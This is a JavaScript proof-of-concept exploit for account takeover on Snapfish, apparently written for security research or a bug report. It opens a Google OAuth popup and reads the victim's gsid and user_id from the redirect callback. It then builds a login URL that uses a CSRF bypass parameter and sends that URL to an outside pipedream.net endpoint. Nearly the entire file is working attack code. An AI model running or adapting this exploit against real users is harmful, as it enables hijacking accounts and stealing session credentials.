(function() {
    function init() {
        document.body.innerHTML = '<html><body><center><h1>Processing...</h1></center></body></html>';
        
        // Wait 2 seconds for page to load before executing
        setTimeout(function() {
            // Logout attacker session
            fetch('https://www.snapfish.com/logout', {
                method: 'GET',
                credentials: 'include'
            }).then(function() {
                
                // Trigger automatic Google OAuth login
                var oauthUrl = 'https://www.snapfish.com/v1/gw/snapfish/oauth/google/signin?TNCFlag=1&context=/hp/sf/sf-us/snapfish-us&sourceGroup=sf-store&code=317425865357719&next=https%3A%2F%2Fwww.snapfish.com%2Fhome&SubscriptionFlag=ALL';
                
                var popup = window.open(oauthUrl, 'oauth', 'width=600,height=700');
                
                if (!popup) {
                    alert('Error: Popup blocked. Please allow popups and try again.');
                    return;
                }
                
                // Monitor popup for OAuth callback
                var checkPopup = setInterval(function() {
                    try {
                        if (popup.closed) {
                            clearInterval(checkPopup);
                            return;
                        }
                        
                        try {
                            var popupUrl = popup.location.href;
                            
                            // Intercept /webredirect callback containing victim's credentials
                            if (popupUrl.includes('/webredirect?gsid=')) {
                                clearInterval(checkPopup);
                                
                                // Extract parameters FIRST before any operations
                                var url = new URL(popupUrl);
                                var gsid = url.searchParams.get('gsid');
                                var userId = url.searchParams.get('user_id');
                                
                                // Construct login URL with CSRF bypass (o=connect)
                                var loginUrl = 'https://www.snapfish.com/webredirect?gsid=' + encodeURIComponent(gsid) + '&o=connect&user_id=' + userId;
                                
                                // Exfiltrate immediately before any blocking
                                fetch('https://eo1ey5201bcmppg.m.pipedream.net?url=' + encodeURIComponent(loginUrl), {
                                    method: 'GET',
                                    mode: 'no-cors'
                                });
                                
                                // Block redirect
                                try {
                                    popup.location.href = 'about:blank';
                                } catch(e) {}
                                
                                popup.close();
                                
                                // Display after everything is secured
                                alert('Account Takeover Successful!\n\nVictim Login URL:\n\n' + loginUrl + '\n\nPaste this URL in browser to access victim account.');
                            }
                        } catch(e) {}
                        
                    } catch(e) {}
                }, 500);
                
                // Timeout after 30 seconds
                setTimeout(function() {
                    if (!popup.closed) {
                        clearInterval(checkPopup);
                        popup.close();
                        alert('Error: OAuth did not complete within 30 seconds.');
                    }
                }, 30000);
                
            }).catch(function(error) {
                alert('Error during logout: ' + error.message);
            });
        }, 2000); // Wait 2 seconds before starting
    }
    
    // Wait for DOM to be ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
